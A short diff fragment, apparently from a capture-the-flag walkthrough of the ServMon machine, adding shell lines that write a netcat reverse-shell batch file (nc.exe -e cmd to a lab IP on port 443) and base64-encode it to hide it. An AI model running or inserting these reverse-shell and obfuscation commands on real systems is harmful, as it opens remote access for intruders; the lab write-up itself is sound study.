@@ -1091,3 +1091,8 @@ servmon\nadine
 ```
 PS C:\programdata> echo 'C:\programdata\nc.exe -e cmd 10.10.14.152 443' > evil.bat
 
+
+[★]$ echo '\programdata\nc.exe 10.10.15.132 443 -e cmd' > shell.bat
+[★]$ cat shell.bat | iconv -t utf-16le | base64 -w 0
+XABwAHIAbwBnAHIAYQBtAGQAYQB0AGEAXABuAGMALgBlAHgAZQAgADEAMAAuADEAMAAuADEANQAuADEAMwAyACAANAA0ADMAIAAtAGUAIABjAG0AZAAKAA==
+```
